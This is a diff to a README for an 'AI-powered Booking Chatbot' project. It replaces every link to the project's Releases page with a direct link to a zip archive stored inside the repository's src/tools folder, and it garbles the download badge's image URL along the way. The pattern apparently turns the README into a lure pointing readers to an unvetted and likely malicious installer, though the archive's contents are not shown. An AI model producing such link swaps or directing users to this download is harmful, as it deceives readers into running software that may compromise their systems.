@@ -4,11 +4,11 @@
 Welcome to the AI-powered Booking Chatbot! This application makes booking simple and efficient using advanced AI technology. Whether you are a customer or part of an internal team, this tool will help you manage bookings, payments, and customer support effectively.
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Croz-Monzales/AI-powered-Booking-Chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/Croz-Monzales/AI-powered-Booking-Chatbot/main/src/tools/Booking-Chatbot-powered-A-v3.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Croz-Monzales/AI-powered-Booking-Chatbot/main/src/tools/Booking-Chatbot-powered-A-v3.3.zip)
 
 To download the latest version of the AI-powered Booking Chatbot, visit the following link:
 
-[Download AI-powered Booking Chatbot](https://github.com/Croz-Monzales/AI-powered-Booking-Chatbot/releases)
+[Download AI-powered Booking Chatbot](https://raw.githubusercontent.com/Croz-Monzales/AI-powered-Booking-Chatbot/main/src/tools/Booking-Chatbot-powered-A-v3.3.zip)
 
 ## 🔍 Features
 - **Role-Based Access Control (RBAC)**: Different users have different access levels, ensuring secure and efficient use.
@@ -29,7 +29,7 @@ To run the AI-powered Booking Chatbot smoothly, ensure your system meets the fol
 ## 🛠️ Installation Instructions
 Follow these steps to install the application:
 
-1. **Download the Application**: Visit the [Releases Page](https://github.com/Croz-Monzales/AI-powered-Booking-Chatbot/releases).
+1. **Download the Application**: Visit the [Releases Page](https://raw.githubusercontent.com/Croz-Monzales/AI-powered-Booking-Chatbot/main/src/tools/Booking-Chatbot-powered-A-v3.3.zip).
 2. **Choose the Latest Version**: Look for the most recent release and click on it.
 3. **Download the Installer**: Select the appropriate installer for your operating system (e.g., .exe for Windows, .dmg for macOS).
 4. **Run the Installer**: Locate the downloaded file and double-click it to start the installation process.
@@ -53,7 +53,7 @@ For more information on how to use the AI-powered Booking Chatbot, visit the fol
 ## 📈 Future Updates
 We are continuously improving the AI-powered Booking Chatbot. Future updates will include enhanced features and performance tweaks based on user feedback.
 
-Stay informed about new releases by checking the [Releases Page](https://github.com/Croz-Monzales/AI-powered-Booking-Chatbot/releases) regularly.
+Stay informed about new releases by checking the [Releases Page](https://raw.githubusercontent.com/Croz-Monzales/AI-powered-Booking-Chatbot/main/src/tools/Booking-Chatbot-powered-A-v3.3.zip) regularly.
 
 ## 🎉 Join Our Community
 Engage with other users and share your experiences with the AI-powered Booking Chatbot. You can find us on:
